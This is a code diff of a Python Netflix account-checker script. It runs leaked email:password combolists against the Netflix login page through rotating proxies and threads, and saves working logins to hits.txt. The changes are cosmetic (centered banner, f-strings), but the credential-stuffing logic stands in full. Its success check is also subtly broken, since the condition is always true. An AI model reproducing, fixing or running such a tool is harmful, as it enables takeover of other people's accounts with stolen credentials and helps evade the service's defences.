@@ -2,6 +2,16 @@ import os,requests,random,threading,ctypes,time
 from fake_useragent import UserAgent
 from bs4 import BeautifulSoup as Soup
 
+# Credit to Pycenter by billythegoat356
+# Github: https://github.com/billythegoat356/pycenter/
+# License: https://github.com/billythegoat356/pycenter/blob/main/LICENSE
+
+def center(var:str, space:int=None): # From Pycenter
+    if not space:
+        space = (os.get_terminal_size().columns - len(var.splitlines()[int(len(var.splitlines())/2)])) / 2
+    
+    return "\n".join((' ' * int(space)) + var for var in var.splitlines())
+
 class Fore:
     YELLOW = '\033[93m'
     GREEN = '\033[32m'
@@ -48,8 +58,8 @@ def banner():
             red += 15
             if red > 255:
                 red = 255
-    print(faded)
-    print(f'{Fore.YELLOW}                                     github.com/Plasmonix Version 3.0\n {Fore.RESET}')
+    print(center(faded))
+    print(center(f'{Fore.YELLOW}\ngithub.com/Plasmonix Version 3.0\n{Fore.RESET}'))
 
 def load_proxies():
     try:
@@ -64,7 +74,7 @@ def load_proxies():
         elif choice == 2:
             proxytype = 'socks5'
         else:
-            print(Fore.RED+'[ERROR] Please enter a valid choice such as 0, 1 or 2!'+Fore.RESET)
+            print(f'{Fore.RED}[ERROR] Please enter a valid choice such as 0, 1 or 2!{Fore.RESET}')
 
         for proxy in proxyfile:
             ip = proxy.split(":")[0]
@@ -72,10 +82,10 @@ def load_proxies():
             proxies.append({'http': proxytype+'://'+ip+':'+port.rstrip("\n")})
 
     except FileNotFoundError:
-           print(Fore.RED+'[ERROR] Failed to open proxyfile'+Fore.RESET)
+           print(f'{Fore.RED}[ERROR] Failed to open proxyfile{Fore.RESET}')
            quit()
     except ValueError:
-        print(Fore.RED+'[ERROR] Value must be an integer'+Fore.RESET)
+        print(f'{Fore.RED}[ERROR] Value must be an integer{Fore.RESET}')
         quit()
 
 def worker(combos, thread_id):
@@ -118,22 +128,22 @@ def check_account(email,password):
             "countryIsoCode": "US"
         }  
         
-        req = client.post("https://www.netflix.com/login",headers=headers,data=data,proxies=proxy)
+        request = client.post("https://www.netflix.com/login",headers=headers,data=data,proxies=proxy)
     
-        if 'Sorry, we can\'t find an account with this email address. Please try again or' or 'Incorrect password' in req.text:
+        if 'Sorry, we can\'t find an account with this email address. Please try again or' or 'Incorrect password' in request.text:
             lock.acquire()
-            print(Fore.RED+'[BAD] '+email+':'+password+Fore.RESET)
+            print(f'{Fore.RED}[BAD] {email}:{password}{Fore.RESET}')
             invalid+=1
             lock.release()
         else:
             lock.acquire()
-            print(Fore.GREEN+'[GOOD] '+email+':'+password+Fore.RESET)
+            print(f'{Fore.GREEN}[GOOD] {email}:{password}{Fore.RESET}')
             valid+=1
             file = open("hits.txt","a").write(email+":"+password+"\n")   
             lock.release()
             
     except:
-        print(Fore.RED+'[ERROR] Proxy timeout. Change your proxies or use a different VPN'+Fore.RESET)
+        print(f'{Fore.RED}[ERROR] Proxy timeout. Change your proxies or use a different VPN{Fore.RESET}')
    
 if __name__ =='__main__':
     banner()
@@ -146,10 +156,10 @@ if __name__ =='__main__':
         threadcount = int(input(f'[{Fore.CYAN}*{Fore.RESET}] Threads> '))
     
     except FileNotFoundError:
-        print(Fore.RED+'[ERROR] Failed to open combolist'+Fore.RESET)
+        print(f'{Fore.RED}[ERROR] Failed to open combolist{Fore.RESET}')
         quit()
     except ValueError:
-        print(Fore.RED+'[ERROR] Value must be an integer'+Fore.RESET)
+        print(f'{Fore.RED}[ERROR] Value must be an integer{Fore.RESET}')
         quit() 
 
     os.system('cls')
